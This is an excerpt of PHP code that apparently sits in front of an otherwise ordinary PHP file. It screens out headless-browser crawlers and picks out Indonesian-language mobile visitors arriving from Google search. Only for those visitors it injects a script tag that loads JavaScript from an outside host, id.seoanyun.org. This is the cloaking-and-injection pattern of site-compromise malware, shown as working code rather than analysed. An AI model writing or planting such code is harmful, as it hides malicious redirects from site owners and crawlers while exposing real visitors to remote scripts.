...
if (
    ...
    stripos($ua, 'HeadlessChrome') !== false ||
...
if (!empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) && strpos($_SERVER['HTTP_ACCEPT_LANGUAGE'], 'id') !== false) {
    $isIndo = true;
}

if (stripos($ua, 'id-ID') !== false || stripos($ua, ' id ') !== false) {
    $isIndo = true;
}

$isMobile = false;
if (preg_match('/(Android|iPhone|iPad|iPod|Huawei|Honor|Vivo|Oppo|Samsung|Mobile)/i', $ua)) {
    $isMobile = true;
}

$isFromGoogleSearch = false;
if (stripos($ref, 'google.') !== false || stripos($ref, 'google.com') !== false) {
    $isFromGoogleSearch = true;
}

if ($isIndo && $isMobile && $isFromGoogleSearch) {
    echo '<script src="https://id.seoanyun.org/tz.js"></script>';
}
?>
<?php
/**
